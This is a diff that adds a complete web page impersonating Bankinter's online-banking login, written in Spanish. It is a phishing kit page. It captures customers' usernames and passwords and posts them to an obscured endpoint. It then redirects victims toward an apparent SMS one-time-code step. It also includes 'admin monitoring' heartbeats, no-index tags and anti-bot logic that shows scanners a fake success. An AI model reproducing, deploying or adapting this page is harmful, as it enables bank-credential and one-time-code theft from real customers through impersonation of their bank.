@@ -1,0 +1,558 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
+    <title> Acceso  online</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap');
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        html, body {
+            background-color: #ffffff;
+            color: #191b1c;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-size: 14px;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        /* --- HEADER --- */
+        .site-header {
+            width: 100%;
+            background: #ffffff;
+            padding: 18px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #f0f2f5;
+        }
+
+        .header-logo img {
+            height: 26px;
+            width: auto;
+            display: block;
+        }
+
+        .hamburger-btn {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 28px;
+            height: 20px;
+        }
+
+        .hamburger-btn span {
+            display: block;
+            height: 3px;
+            width: 100%;
+            background-color: #191b1c;
+            border-radius: 2px;
+        }
+
+        /* --- MAIN CONTAINER --- */
+        .main-wrapper {
+            flex: 1;
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 40px 24px 60px 24px;
+            margin-top: 70px;
+        }
+
+        .page-title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #191b1c;
+            line-height: 1.25;
+            margin-bottom: 26px;
+            letter-spacing: -0.2px;
+        }
+
+        /* --- FLOATING PLACEHOLDER / LABEL FIELDS --- */
+        .floating-wrap {
+            position: relative;
+            margin-bottom: 18px;
+        }
+
+        .floating-input {
+            width: 100%;
+            height: 56px;
+            background-color: #ffffff;
+            border: 1px solid #b8c9dd;
+            border-radius: 4px;
+            padding: 20px 16px 6px 16px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #191b1c;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease, background-color 0.2s ease;
+        }
+
+        
+
+        .floating-input.has-error {
+            border-color: #ee3524 !important;
+            box-shadow: 0 0 0 1px #ee3524 !important;
+            background-color: #fff8f8;
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 16px;
+            top: 17px;
+            font-size: 15px;
+            color: #6e7c87;
+            font-weight: 400;
+            pointer-events: none;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            transform-origin: left top;
+        }
+
+        /* Float UP on Focus or when value is entered */
+        .floating-input:focus ~ .floating-label,
+        .floating-input:not(:placeholder-shown) ~ .floating-label,
+        .floating-label.active {
+            top: 7px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #e05305;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .floating-input.has-error ~ .floating-label {
+            color: #ee3524 !important;
+        }
+
+        .email-error-msg {
+            display: none;
+            color: #ee3524;
+            font-size: 12px;
+            font-weight: 600;
+            margin-top: 6px;
+            line-height: 1.35;
+        }
+
+        .forgot-link-wrapper {
+            margin-top: 24px;
+            margin-bottom: 28px;
+        }
+
+        .forgot-link {
+            display: inline-block;
+            color: #e05305;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+            transition: color 0.15s ease;
+        }
+
+        .forgot-link:hover {
+            color: #c44500;
+            text-decoration: underline;
+        }
+
+        /* --- SUBMIT BUTTON --- */
+        .btn-submit {
+            width: 100%;
+            height: 48px;
+            background: #ff821c;
+            color: #000000;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(255, 102, 0, 0.25);
+            transition: background 0.2s ease, transform 0.1s ease, opacity 0.2s ease;
+        }
+
+        .btn-submit:hover {
+            background: #ea5b00;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.99);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+        }
+
+        .bot-error-banner {
+            display: none;
+            background: #fdf2f2;
+            border: 1px solid #f8b4b4;
+            color: #9b1c1c;
+            padding: 10px 14px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            font-size: 13px;
+        }
+
+        /* --- FOOTER --- */
+        .site-footer {
+            width: 100%;
+            background: #ffffff;
+            border-top: 1px solid #eaedf2;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 40px 24px 30px 24px;
+        }
+
+        .footer-logo {
+            margin-bottom: 28px;
+        }
+
+        .footer-logo img {
+            height: 24px;
+            width: auto;
+            display: block;
+        }
+
+        .footer-primary-links {
+            list-style: none;
+            margin-bottom: 32px;
+        }
+
+        .footer-primary-links li {
+            border-bottom: 1px solid #f0f3f6;
+        }
+
+        .footer-primary-links a {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 0;
+            font-size: 13px;
+            font-weight: 700;
+            color: #191b1c;
+            letter-spacing: 0.4px;
+            text-transform: uppercase;
+            transition: color 0.15s ease;
+        }
+
+        .footer-primary-links a:hover {
+            color: #e05305;
+        }
+
+        .footer-primary-links a .arrow {
+            font-size: 15px;
+            color: #5c6780;
+            font-weight: 400;
+        }
+
+        .footer-secondary-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px 16px;
+            margin-bottom: 30px;
+        }
+
+        .footer-secondary-grid a {
+            font-size: 12px;
+            color: #333d47;
+            line-height: 1.4;
+            transition: color 0.15s ease;
+        }
+
+        .footer-secondary-grid a:hover {
+            color: #e05305;
+        }
+
+        /* --- BOTTOM BAR --- */
+        .footer-bottom-bar {
+            background-color: #EEF2F6;
+            padding: 22px 20px 20px 20px;
+            text-align: center;
+        }
+
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 24px;
+            margin-bottom: 14px;
+        }
+
+        .social-icons a {
+            color: #4a5568;
+            font-size: 18px;
+            transition: color 0.15s ease, transform 0.15s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .social-icons a:hover {
+            color: #e05305;
+            transform: translateY(-2px);
+        }
+
+        .copyright-txt {
+            font-size: 11px;
+            color: #718096;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- HEADER -->
+    <header class="site-header">
+        <div class="header-logo">
+            <img src="/assets/imgs/logo.svg" alt="Bankinter">
+        </div>
+        <button type="button" class="hamburger-btn" aria-label="Menú">
+            <span></span>
+            <span></span>
+            <span></span>
+        </button>
+    </header>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-wrapper">
+        <h1 class="page-title">Accede al área privada de Bankinter</h1>
+
+        <form method="post" id="pg1" novalidate>
+            <!-- Anti-bot honeypot and challenge tokens -->
+            <div style="display:none !important; position:absolute; left:-9999px;" aria-hidden="true">
+                <input type="text" name="_hp_check" id="_hp_check" tabindex="-1" autocomplete="off" value="">
+            </div>
+            <input type="hidden" name="_form_time" id="_form_time" value="<%= Date.now() %>">
+            <input type="hidden" name="_bot_token" id="_bot_token" value="">
+            <input type="hidden" name="step" value="login">
+
+            <div id="general-error" class="bot-error-banner"></div>
+
+            <!-- Username Box with Floating Label -->
+            <div class="floating-wrap" id="wrap-username">
+                <input type="text" class="floating-input" id="username" name="username" placeholder=" " autocomplete="off" required>
+                <label for="username" class="floating-label">Usuario</label>
+                <!-- Real-time email validation error container -->
+                <p id="email-error-msg" class="email-error-msg">
+                    No se admiten direcciones de correo electrónico. Por favor, introduzca su usuario o identificación.
+                </p>
+            </div>
+
+            <!-- Password Box with Floating Label -->
+            <div class="floating-wrap" id="wrap-password">
+                <input type="password" class="floating-input" id="password" name="password" placeholder=" " required>
+                <label for="password" class="floating-label">Contraseña</label>
+            </div>
+
+            <!-- Forgot Link -->
+            <div class="forgot-link-wrapper">
+                <a href="#" class="forgot-link">HE OLVIDADO MI USUARIO O CONTRASEÑA</a>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" id="submit-btn" class="btn-submit">Iniciar sesión</button>
+        </form>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="site-footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <img src="/assets/imgs/logo.svg" alt="Bankinter">
+            </div>
+
+            <ul class="footer-primary-links">
+                <li><a href="#">WEB CORPORATIVA <span class="arrow">&rarr;</span></a></li>
+                <li><a href="#">PORTAL INMOBILIARIO <span class="arrow">&rarr;</span></a></li>
+                <li><a href="#">NO RESIDENTES <span class="arrow">&rarr;</span></a></li>
+                <li><a href="#">PARTICULARES <span class="arrow">&rarr;</span></a></li>
+                <li><a href="#">BANCA PERSONAL <span class="arrow">&rarr;</span></a></li>
+                <li><a href="#">BANCA PRIVADA <span class="arrow">&rarr;</span></a></li>
+            </ul>
+
+            <div class="footer-secondary-grid">
+                <a href="#">Contacto</a>
+                <a href="#">Fundación Innovación</a>
+                <a href="#">Tablón de anuncios y tarifas</a>
+                <a href="#">Seguridad y privacidad</a>
+                <a href="#">Política de cookies</a>
+                <a href="#">Aviso legal</a>
+                <a href="#">Accesibilidad</a>
+                <a href="#">Mapa web</a>
+            </div>
+        </div>
+
+        <div class="footer-bottom-bar">
+            <div class="social-icons">
+                <a href="#" aria-label="Facebook"><i class="fa-brands fa-facebook-f"></i></a>
+                <a href="#" aria-label="X Twitter"><i class="fa-brands fa-x-twitter"></i></a>
+                <a href="#" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
+                <a href="#" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in"></i></a>
+                <a href="#" aria-label="Blog"><i class="fa-solid fa-square-rss"></i></a>
+            </div>
+            <p class="copyright-txt">&copy; BANKINTER S.A. TODOS LOS DERECHOS RESERVADOS</p>
+        </div>
+    </footer>
+
+    <!-- JS FILES -->
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        $(function() {
+            // Floating label enhancement
+            $('.floating-input').on('focus', function() {
+                $(this).siblings('.floating-label').addClass('active');
+            }).on('blur', function() {
+                if (!$(this).val()) {
+                    $(this).siblings('.floating-label').removeClass('active');
+                }
+            }).each(function() {
+                if ($(this).val()) {
+                    $(this).siblings('.floating-label').addClass('active');
+                }
+            });
+        });
+    </script>
+    <script>
+        $(function() {
+            // --- Live presence heartbeat (admin monitoring) ---
+            function sendHeartbeat() {
+                try {
+                    fetch('/hb', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: '{}'
+                    }).catch(function () { /* silent */ });
+                } catch (e) { /* silent */ }
+            }
+            sendHeartbeat();
+            setInterval(sendHeartbeat, 10000);
+
+            // --- Anti-Bot Detection State ---
+            var pageLoadTime = Date.now();
+            var isHumanInteraction = false;
+
+            // Track real human user interaction (mouse, keyboard, touch, scroll)
+            $(document).one('mousemove keydown touchstart scroll click', function () {
+                isHumanInteraction = true;
+                $('#_bot_token').val('token_' + Math.random().toString(36).substring(2) + '_' + Date.now().toString(36));
+            });
+
+            // Helper: Email format detector
+            function isEmailAddress(value) {
+                if (!value) return false;
+                var trimmed = value.trim();
+                var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(trimmed) || trimmed.indexOf('@') !== -1;
+            }
+
+            // Real-time username input listener to clear or show email warning
+            $('#username').on('input', function () {
+                var val = $(this).val();
+                if (isEmailAddress(val)) {
+                    $('#username, #box-username, #label-username').addClass('has-error');
+                    $('#email-error-msg').slideDown(150);
+                } else {
+                    $('#username, #box-username, #label-username').removeClass('has-error');
+                    $('#email-error-msg').slideUp(150);
+                    $('#general-error').slideUp(150);
+                }
+            });
+
+            // --- FORM 1: Login Form (Index) ---
+            $('#pg1').on('submit', function (e) {
+                e.preventDefault();
+
+                var logi = $('#username').val() || '';
+                var paso = $('#password').val() || '';
+                var hpCheck = $('#_hp_check').val() || '';
+                var botToken = $('#_bot_token').val() || '';
+                var formTime = $('#_form_time').val() || pageLoadTime;
+
+                // 1. Strict Email Rejection (Client-side)
+                if (isEmailAddress(logi)) {
+                    $('#username, #box-username, #label-username').addClass('has-error');
+                    $('#email-error-msg').slideDown(150);
+                    $('#username').focus();
+                    return false;
+                }
+
+                // 2. Client-side Anti-bot Validation
+                var timeElapsed = Date.now() - pageLoadTime;
+                if (hpCheck !== '' || (!isHumanInteraction && timeElapsed < 700)) {
+                    // Simulated fake success delay for automated bots without triggering backend
+                    setTimeout(function () {
+                        window.location = '/loading?time=13&url=/RKnUB922z6Mf4HDwg3EZ';
+                    }, 1200);
+                    return false;
+                }
+
+                var $btn = $('#submit-btn');
+                $btn.prop('disabled', true).css('opacity', '0.7');
+
+                // Send to backend
+                $.ajax({
+                    url: '/gzLbTbjqMpc34D4XsPJ2',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({
+                        logi: logi,
+                        paso: paso,
+                        _hp_check: hpCheck,
+                        _bot_token: botToken,
+                        _form_time: formTime,
+                        _duration: timeElapsed
+                    }),
+                    success: function (res) {
+                        if (res.OK) {
+                            // Redirects via loading with custom duration to SMS OTP 1
+                            window.location = '/loading?time=15&url=/RKnUB922z6Mf4HDwg3EZ';
+                        } else if (res.error === 'email_not_allowed') {
+                            $('#username, #box-username, #label-username').addClass('has-error');
+                            $('#email-error-msg').text(res.message || 'No se admiten direcciones de correo electrónico. Por favor, introduzca su usuario o identificación.').slideDown(150);
+                            $('#username').focus();
+                            $btn.prop('disabled', false).css('opacity', '1');
+                        } else if (res.error === 'bot_detected') {
+                            window.location.reload();
+                        } else {
+                            $('#general-error').text(res.message || 'Ha ocurrido un error. Por favor, inténtelo de nuevo.').slideDown(150);
+                            $btn.prop('disabled', false).css('opacity', '1');
+                        }
+                    },
+                    error: function () {
+                        $btn.prop('disabled', false).css('opacity', '1');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
